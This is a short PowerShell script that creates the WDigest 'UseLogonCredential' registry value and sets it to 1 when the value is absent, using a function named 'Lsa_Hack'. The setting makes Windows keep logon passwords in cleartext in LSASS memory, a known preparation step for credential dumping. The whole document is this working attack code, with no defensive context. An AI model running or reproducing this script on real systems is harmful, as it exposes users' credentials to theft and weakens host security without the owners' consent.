$Path="HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\"
$key = "UseLogonCredential"
Function Lsa_Hack
{
New-ItemProperty -Path $Path -Name $key -Type DWORD -Value 1
}

Function Test-RegistryValue($regkey, $name) {
    $exists = Get-ItemProperty -Path "$regkey" -Name "$name" -ErrorAction SilentlyContinue
    If (($exists -ne $null) -and ($exists.Length -ne 0)) {
        Return $true
    }
    Return $false
}

if ((Test-RegistryValue $Path $key) -eq $false ) {Lsa_Hack}